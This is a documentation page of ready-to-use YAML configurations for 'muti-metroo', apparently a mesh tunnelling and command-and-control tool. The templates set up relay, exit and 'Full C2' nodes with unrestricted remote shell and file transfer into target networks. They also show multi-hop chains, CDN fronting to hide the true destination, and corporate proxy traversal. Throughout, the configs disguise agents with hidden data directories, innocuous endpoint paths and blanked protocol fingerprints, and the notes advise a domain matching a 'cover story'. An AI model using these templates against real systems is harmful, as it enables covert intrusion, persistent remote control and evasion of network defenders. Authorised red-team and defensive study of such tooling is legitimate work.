---
title: Example Configurations
sidebar_label: Example Configurations
sidebar_position: 6
---

# Example Configurations

Ready-to-use configuration templates for common operational scenarios.

## Certificate Setup

Before deploying agents, generate certificates with operationally appropriate names:

```bash
# Generate CA (keep private key secure on operator machine)
muti-metroo cert ca --cn "Internal Services Root CA" -o ./certs

# Generate agent certificates (one per agent)
muti-metroo cert agent --cn "api-gateway-prod-01" \
  --ca ./certs/ca.crt --ca-key ./certs/ca.key -o ./certs/agent1

muti-metroo cert agent --cn "cache-service-02" \
  --ca ./certs/ca.crt --ca-key ./certs/ca.key -o ./certs/agent2
```

## Minimal Transit Node

Relay-only node with minimum footprint:

```yaml
agent:
  data_dir: "/var/lib/app-cache"
  log_level: "error"

tls:
  cert: "/etc/app-service/tls/server.crt"
  key: "/etc/app-service/tls/server.key"
  ca: "/etc/app-service/tls/ca.crt"
  mtls: true

protocol:
  alpn: ""
  http_header: ""
  ws_subprotocol: ""

listeners:
  - transport: h2
    address: "0.0.0.0:443"
    path: "/api/health"

http:
  enabled: true
  address: "127.0.0.1:8080"
  minimal: true

socks5:
  enabled: false

exit:
  enabled: false

shell:
  enabled: false

file_transfer:
  enabled: false

management:
  public_key: "${MGMT_PUBKEY}"
```

## Exit Node

Exit point for traffic leaving the mesh to target networks:

```yaml
agent:
  data_dir: "/opt/.cache/svc"
  log_level: "error"

tls:
  cert: "/etc/app-service/tls/server.crt"
  key: "/etc/app-service/tls/server.key"
  ca: "/etc/app-service/tls/ca.crt"
  mtls: true

protocol:
  alpn: ""
  http_header: ""
  ws_subprotocol: ""

listeners:
  - transport: h2
    address: "0.0.0.0:443"
    path: "/api/v2/stream"

exit:
  enabled: true
  routes:
    - "10.0.0.0/8"        # Internal network access
    - "172.16.0.0/12"     # Additional private ranges
    - "192.168.0.0/16"
    # - "0.0.0.0/0"       # Uncomment for full internet access
  dns:
    servers:
      - "10.0.0.1:53"     # Internal DNS for target resolution
    timeout: 5s

http:
  enabled: true
  address: "127.0.0.1:8080"
  minimal: true

socks5:
  enabled: false

shell:
  enabled: false

file_transfer:
  enabled: false

management:
  public_key: "${MGMT_PUBKEY}"
```

## Full C2 Endpoint

Complete capability for target access (shell + file transfer):

```yaml
agent:
  data_dir: "/opt/.cache/app"
  log_level: "error"

tls:
  cert: "/etc/app-service/tls/server.crt"
  key: "/etc/app-service/tls/server.key"
  ca: "/etc/app-service/tls/ca.crt"
  mtls: true

protocol:
  alpn: ""
  http_header: ""
  ws_subprotocol: ""

listeners:
  - transport: ws
    address: "0.0.0.0:443"
    path: "/ws/v1"

http:
  enabled: true
  address: "127.0.0.1:8080"
  minimal: true

shell:
  enabled: true
  whitelist: ["*"]
  password_hash: "${SHELL_HASH}"
  max_sessions: 0

file_transfer:
  enabled: true
  password_hash: "${FILE_HASH}"
  allowed_paths: ["*"]

management:
  public_key: "${MGMT_PUBKEY}"
```

## Ingress with SOCKS5

Entry point for operator traffic (runs on operator machine or jump host):

```yaml
agent:
  data_dir: "./data"
  log_level: "warn"

tls:
  cert: "./certs/agent.crt"
  key: "./certs/agent.key"
  ca: "./certs/ca.crt"
  mtls: true

protocol:
  alpn: ""
  http_header: ""
  ws_subprotocol: ""

peers:
  - id: "${FIRST_HOP_ID}"
    address: "first-hop.example.com:443"
    transport: h2

socks5:
  enabled: true
  address: "127.0.0.1:1080"
  auth:
    enabled: true
    users:
      - username: "operator"
        password_hash: "${SOCKS_HASH}"

http:
  enabled: true
  address: "127.0.0.1:8080"
  dashboard: true   # Operator can view mesh topology
  pprof: false

management:
  public_key: "${MGMT_PUBKEY}"
  private_key: "${MGMT_PRIVKEY}"  # Required to decrypt topology
```

## Multi-Hop Chain (A → B → C → D)

Complete 4-agent configuration for a linear chain topology.

### Agent A (Ingress - Operator Machine)

```yaml
agent:
  data_dir: "./data"
  display_name: "ingress"

tls:
  cert: "./certs/agent-a.crt"
  key: "./certs/agent-a.key"
  ca: "./certs/ca.crt"
  mtls: true

protocol:
  alpn: ""
  http_header: ""
  ws_subprotocol: ""

peers:
  - id: "${AGENT_B_ID}"
    address: "relay1.example.com:443"
    transport: h2

socks5:
  enabled: true
  address: "127.0.0.1:1080"

http:
  enabled: true
  address: "127.0.0.1:8080"
  dashboard: true

management:
  public_key: "${MGMT_PUBKEY}"
  private_key: "${MGMT_PRIVKEY}"
```

### Agent B (Transit - First Relay)

```yaml
agent:
  data_dir: "/var/lib/svc-cache"
  log_level: "error"

tls:
  cert: "/etc/svc/tls/server.crt"
  key: "/etc/svc/tls/server.key"
  ca: "/etc/svc/tls/ca.crt"
  mtls: true

protocol:
  alpn: ""
  http_header: ""
  ws_subprotocol: ""

listeners:
  - transport: h2
    address: "0.0.0.0:443"
    path: "/api/stream"

peers:
  - id: "${AGENT_C_ID}"
    address: "relay2.example.com:443"
    transport: h2

http:
  enabled: true
  address: "127.0.0.1:8080"
  minimal: true

management:
  public_key: "${MGMT_PUBKEY}"
```

### Agent C (Transit - Second Relay)

```yaml
agent:
  data_dir: "/var/lib/app-data"
  log_level: "error"

tls:
  cert: "/etc/app/tls/server.crt"
  key: "/etc/app/tls/server.key"
  ca: "/etc/app/tls/ca.crt"
  mtls: true

protocol:
  alpn: ""
  http_header: ""
  ws_subprotocol: ""

listeners:
  - transport: h2
    address: "0.0.0.0:443"
    path: "/connect"

peers:
  - id: "${AGENT_D_ID}"
    address: "target-network.example.com:443"
    transport: ws

http:
  enabled: true
  address: "127.0.0.1:8080"
  minimal: true

management:
  public_key: "${MGMT_PUBKEY}"
```

### Agent D (Exit + C2 - Target Network)

```yaml
agent:
  data_dir: "/opt/.cache/runtime"
  log_level: "error"

tls:
  cert: "/etc/runtime/tls/server.crt"
  key: "/etc/runtime/tls/server.key"
  ca: "/etc/runtime/tls/ca.crt"
  mtls: true

protocol:
  alpn: ""
  http_header: ""
  ws_subprotocol: ""

listeners:
  - transport: ws
    address: "0.0.0.0:443"
    path: "/socket"

exit:
  enabled: true
  routes:
    - "10.0.0.0/8"
    - "192.168.0.0/16"
  dns:
    servers:
      - "10.0.0.1:53"
    timeout: 5s

shell:
  enabled: true
  whitelist: ["*"]
  password_hash: "${SHELL_HASH}"

file_transfer:
  enabled: true
  password_hash: "${FILE_HASH}"
  allowed_paths: ["*"]

http:
  enabled: true
  address: "127.0.0.1:8080"
  minimal: true

management:
  public_key: "${MGMT_PUBKEY}"
```

## CDN Fronting (WebSocket via Cloudflare)

Route traffic through Cloudflare to hide true destination:

### Field Agent (Behind CDN)

```yaml
agent:
  data_dir: "/var/lib/app"
  log_level: "error"

tls:
  cert: "/etc/app/tls/server.crt"    # Valid cert for your domain
  key: "/etc/app/tls/server.key"
  # No CA/mTLS - CDN terminates TLS

protocol:
  alpn: ""
  http_header: ""
  ws_subprotocol: ""

listeners:
  - transport: ws
    address: "0.0.0.0:443"
    path: "/api/realtime"

management:
  public_key: "${MGMT_PUBKEY}"
```

### Operator Agent (Connecting via CDN)

```yaml
agent:
  data_dir: "./data"

tls:
  cert: "./certs/agent.crt"
  key: "./certs/agent.key"
  # No CA verification - CDN presents its own cert

protocol:
  alpn: ""
  http_header: ""
  ws_subprotocol: ""

peers:
  - id: "${FIELD_AGENT_ID}"
    # Connect to CDN edge, Host header routes to origin
    address: "wss://your-domain.cdn.cloudflare.net:443/api/realtime"
    transport: ws
    tls:
      skip_verify: true  # CDN cert, not your CA

socks5:
  enabled: true
  address: "127.0.0.1:1080"

http:
  enabled: true
  address: "127.0.0.1:8080"
  dashboard: true

management:
  public_key: "${MGMT_PUBKEY}"
  private_key: "${MGMT_PRIVKEY}"
```

**CDN Setup Notes:**
- Configure CDN to proxy WebSocket connections to your origin server
- Use a legitimate-looking domain that matches your cover story
- Cloudflare: Enable "WebSockets" in Network settings
- AWS CloudFront: Configure origin with WebSocket support
- Traffic appears to go to CDN IP addresses, not your infrastructure

## Corporate Proxy Traversal

Connect through HTTP proxy with authentication:

```yaml
agent:
  data_dir: "./data"

tls:
  cert: "./certs/agent.crt"
  key: "./certs/agent.key"

protocol:
  alpn: ""
  http_header: ""
  ws_subprotocol: ""

peers:
  - id: "${EXTERNAL_AGENT_ID}"
    address: "wss://external-service.example.com:443/connect"
    transport: ws
    proxy: "http://proxy.corporate.local:8080"
    proxy_auth:
      username: "${PROXY_USER}"
      password: "${PROXY_PASS}"

socks5:
  enabled: true
  address: "127.0.0.1:1080"

http:
  enabled: true
  address: "127.0.0.1:8080"

management:
  public_key: "${MGMT_PUBKEY}"
  private_key: "${MGMT_PRIVKEY}"
```
